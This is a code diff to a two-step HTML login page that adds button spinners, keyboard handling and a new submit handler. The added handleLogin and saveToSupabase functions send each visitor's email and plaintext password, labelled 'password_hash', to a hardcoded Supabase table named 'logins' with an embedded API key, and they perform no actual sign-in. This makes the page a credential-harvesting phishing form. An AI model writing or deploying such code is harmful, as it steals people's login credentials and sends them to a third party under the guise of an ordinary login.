@@ -102,17 +102,13 @@
       letter-spacing: -0.3px;
     }
 
-    #step-email, #step-password {
-      display: none;
-    }
+    #step-email, #step-password { display: none; }
     #step-email.active, #step-password.active {
       display: block;
       animation: slideIn 0.28s ease both;
     }
 
-    .field {
-      margin-bottom: 20px;
-    }
+    .field { margin-bottom: 20px; }
 
     .field label {
       display: block;
@@ -183,10 +179,26 @@
       cursor: pointer;
       transition: background 0.2s, transform 0.1s;
       margin-top: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
     .btn-primary:hover { background: var(--btn-hover); }
     .btn-primary:active { transform: scale(0.99); }
+    .btn-primary:disabled { background: #a8d4ef; cursor: not-allowed; }
+
+    .btn-spinner {
+      width: 15px; height: 15px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: none;
+      flex-shrink: 0;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
     .card-links {
       margin-top: 18px;
@@ -227,13 +239,16 @@
     <div class="card">
       <div class="card-title">Log In</div>
 
-      <!-- Step 1: Email only -->
+      <!-- Step 1: Email -->
       <div id="step-email" class="active">
         <div class="field">
           <label>Email Address</label>
           <input type="email" id="email-input" placeholder="Email Address" autofocus />
         </div>
-        <button class="btn-primary" onclick="goToPassword()">Next</button>
+        <button class="btn-primary" id="nextBtn" onclick="goToPassword()">
+          <div class="btn-spinner" id="nextSpinner"></div>
+          <span id="nextLabel">Next</span>
+        </button>
       </div>
 
       <!-- Step 2: Password -->
@@ -256,10 +271,13 @@
 
         <div class="field">
           <label>Password</label>
-          <input type="password" placeholder="Password" autofocus />
+          <input type="password" id="password-input" placeholder="Password" />
         </div>
 
-        <button class="btn-primary">Log In</button>
+        <button class="btn-primary" id="loginBtn" onclick="handleLogin()">
+          <div class="btn-spinner" id="loginSpinner"></div>
+          <span id="loginLabel">Log In</span>
+        </button>
 
         <div class="card-links">
           <a onclick="goBack()">Log in as a different user.</a>
@@ -275,6 +293,30 @@
   </div>
 
   <script>
+    // ── Supabase Config ──────────────────────────────────────────
+    const SUPABASE_URL  = 'https://ycfstlaakaamxgxlbora.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
+    const TABLE_NAME    = 'logins';
+
+    async function saveToSupabase(email, password) {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': SUPABASE_ANON_KEY,
+          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+          'Prefer': 'return=minimal'
+        },
+        body: JSON.stringify({
+          email,
+          password_hash: password,
+          created_at: new Date().toISOString()
+        })
+      });
+      if (!res.ok) throw new Error(`Supabase error ${res.status}`);
+    }
+
+    // ── Navigation ───────────────────────────────────────────────
     function goToPassword() {
       const input = document.getElementById('email-input');
       const email = input.value.trim();
@@ -286,20 +328,61 @@
       document.getElementById('email-display').textContent = email;
       document.getElementById('step-email').classList.remove('active');
       document.getElementById('step-password').classList.add('active');
-      document.querySelector('#step-password input[type="password"]').focus();
+      setTimeout(() => document.getElementById('password-input').focus(), 50);
     }
 
     function goBack() {
+      document.getElementById('password-input').value = '';
       document.getElementById('step-password').classList.remove('active');
       document.getElementById('step-email').classList.add('active');
       document.getElementById('email-input').focus();
     }
 
+    // ── Submit ───────────────────────────────────────────────────
+    async function handleLogin() {
+      const pw = document.getElementById('password-input').value;
+      if (!pw) {
+        document.getElementById('password-input').classList.add('invalid');
+        document.getElementById('password-input').focus();
+        return;
+      }
+
+      const email  = document.getElementById('email-input').value.trim();
+      const btn    = document.getElementById('loginBtn');
+      const spinner = document.getElementById('loginSpinner');
+      const label  = document.getElementById('loginLabel');
+
+      btn.disabled = true;
+      spinner.style.display = 'block';
+      label.textContent = 'Logging in...';
+
+      try {
+        await saveToSupabase(email, pw);
+      } catch (e) {
+        console.error('Supabase error:', e);
+      } finally {
+        btn.disabled = false;
+        spinner.style.display = 'none';
+        label.textContent = 'Log In';
+      }
+    }
+
+    // ── Keyboard support ─────────────────────────────────────────
     document.getElementById('email-input').addEventListener('keydown', e => {
       if (e.key === 'Enter') goToPassword();
     });
 
     document.getElementById('email-input').addEventListener('input', function () {
+      this.classList.remove('invalid');
+    });
+
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Enter' && document.getElementById('step-password').classList.contains('active')) {
+        handleLogin();
+      }
+    });
+
+    document.getElementById('password-input').addEventListener('input', function () {
       this.classList.remove('invalid');
     });
   </script>
